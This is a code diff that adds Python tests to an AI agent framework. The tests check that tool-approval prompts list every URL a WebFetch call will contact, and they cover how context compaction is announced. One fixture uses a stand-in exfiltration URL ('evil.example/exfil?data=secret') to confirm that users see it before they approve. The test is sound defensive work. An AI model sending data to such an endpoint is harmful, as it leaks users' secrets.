@@ -3,6 +3,7 @@
 from __future__ import annotations
 
 import asyncio
+from dataclasses import replace
 from pathlib import Path
 from typing import Any
 
@@ -13,7 +14,7 @@ from hx.core.context import ContextBuilder
 from hx.core.events import EventBus, TextDelta, ToolCallFinished, TurnFinished
 from hx.core.lateinject import Injection, InjectionRegistry
 from hx.core.loop import AgentLoop
-from hx.core.messages import StopReason
+from hx.core.messages import StopReason, ToolUseBlock
 from hx.core.session import new_session
 from hx.core.title import TITLE_MAX_TOKENS
 from hx.core.usage import TurnUsage
@@ -633,3 +634,105 @@ async def test_only_the_first_call_renders_the_whole_registry(
 
     assert len(h.loop.session.usage.turns) == 3, "the turn did not make three calls"
     assert whole == 1, f"the whole registry was rendered {whole} times across three calls"
+
+
+# --- what the approval prompt actually shows -------------------------------
+
+
+def test_a_list_argument_is_spelled_out_in_the_approval() -> None:
+    """``WebFetch`` asked the user to approve ``urls=[2 items]``.
+
+    Which URLs are about to leave the machine is the entire question, and that
+    rendering answered it with a number. The one-line *header* may collapse a
+    list; the detail the user reads before pressing yes may not.
+    """
+    from hx.core.loop import _permission_detail
+
+    call = ToolUseBlock(
+        id="1",
+        name="WebFetch",
+        input={
+            "urls": ["https://good.example/a", "https://evil.example/exfil?data=secret"],
+            "extract_depth": "basic",
+        },
+    )
+    detail, kind = _permission_detail(call)
+
+    assert kind == "text"
+    assert "https://good.example/a" in detail
+    assert "https://evil.example/exfil?data=secret" in detail
+    assert "[2 items]" not in detail
+
+
+def test_a_very_long_list_is_truncated_with_a_count() -> None:
+    """A prompt the user has to scroll is a prompt they stop reading."""
+    from hx.core.loop import _MAX_LISTED, _permission_detail
+
+    urls = [f"https://example.com/{index}" for index in range(_MAX_LISTED + 5)]
+    detail, _ = _permission_detail(ToolUseBlock(id="1", name="WebFetch", input={"urls": urls}))
+
+    assert f"https://example.com/{_MAX_LISTED - 1}" in detail
+    assert f"https://example.com/{_MAX_LISTED}" not in detail
+    assert "and 5 more" in detail
+
+
+def test_the_one_line_header_still_collapses_a_list() -> None:
+    """The header is a header: it has a line to work with, not a screen."""
+    from hx.core.loop import _brief
+
+    assert _brief({"urls": ["a", "b", "c"]}) == "urls=[3 items]"
+
+
+async def test_an_automatic_compaction_with_nothing_to_do_is_not_announced(
+    hx_home: Path, tmp_path: Path
+) -> None:
+    """A threshold that has been crossed stays crossed.
+
+    When the split has nothing behind it, the automatic path used to announce a
+    compaction, run it, and report that nothing happened - once per turn for
+    the rest of the session. The check is pure, so a turn that cannot compact
+    costs neither a provider call nor a line of UI.
+    """
+    from hx.core.compaction import Compactor
+    from hx.core.events import CompactionFinished, CompactionStarted
+
+    # Always over the threshold, but only two messages behind the split.
+    compactor = Compactor(provider=None, model="m", keep_recent_turns=6)
+
+    async with build_loop(
+        [tool_turn("Echo", {"text": "one"}), text_turn("done")],
+        tmp_path,
+        tools=_echo_registry(),
+    ) as h:
+        h.loop.compactor = compactor
+        h.loop.settings = replace(
+            h.loop.settings, context=replace(h.loop.settings.context, compact_at=0.0001)
+        )
+        h.loop.session.usage.context_tokens = 999_999
+        h.loop.session.usage.context_window = 1_000_000
+        await h.loop.run("go")
+
+    announced = [e for e in h.events if isinstance(e, CompactionStarted | CompactionFinished)]
+    assert announced == []
+
+
+async def test_an_explicit_compaction_still_reports_when_there_is_nothing_to_do(
+    hx_home: Path, tmp_path: Path
+) -> None:
+    """Somebody who types ``/compact`` is owed the answer either way."""
+    from hx.core.compaction import Compactor
+    from hx.core.events import CompactionFinished, CompactionStarted
+
+    async with build_loop([text_turn("done")], tmp_path) as h:
+        h.loop.compactor = Compactor(provider=None, model="m", keep_recent_turns=6)
+        assert await h.loop.compact(reason="requested") is False
+
+    kinds = {type(e) for e in h.events}
+    assert CompactionStarted in kinds
+    assert CompactionFinished in kinds
+
+
+def _echo_registry() -> ToolRegistry:
+    registry = ToolRegistry()
+    registry.register(EchoTool())
+    return registry
